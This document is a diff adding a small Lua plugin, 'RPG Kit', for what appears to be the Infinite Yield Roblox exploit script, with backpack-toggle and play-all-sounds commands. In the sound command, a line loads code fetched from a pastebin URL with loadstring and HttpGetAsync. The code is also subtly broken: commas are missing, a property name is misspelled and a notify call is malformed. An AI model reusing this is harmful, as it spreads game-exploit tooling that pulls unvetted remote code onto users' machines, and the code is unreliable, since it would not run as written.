@@ -1,0 +1,35 @@
+local Plugin = {
+    ["PluginName"] = "RPG Kit",
+    ["PluginDescription"] = "A infinite yield that will give you the ability to execute special commands.",
+    ["Commands"] = {
+    	["EnableBackpack"] = {
+    		["ListName"] = "Backpack On"
+    	    ["Description"] = "Toggles your backpack on. || You have to click on the tools.",
+            ["Aliases"] = {"BOn","BackpackOn","backpack"},
+            ["Function"] = function(args,speaker)
+            game.StarterGui:SetCoreGuiEnabled(2, true)
+        end
+
+    	}
+    	    ["PlayWorkspace"] = {
+            ["ListName"] = "Play [workspace sounds]",
+            ["Description"] = "Gives you the ability to play sounds.",
+            ["Aliases"] = {"Psound","PlaySound"},
+            ["Function"] = function(args,speaker)
+              --CODE HERE 
+			 if game.SoundService.RespectFiltreringEnabled == false then
+			 	for i,v in pairs(game.Workspace:GetDescendants()) do
+			 		if v:IsA("Sound") then
+			 			v:Play()
+			 		end
+			 	end
+			 else loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))
+			 	notify("Sound is unexploitable.", warn(":("))
+			 end
+            end
+        }
+        
+    }
+}
+
+return Plugin
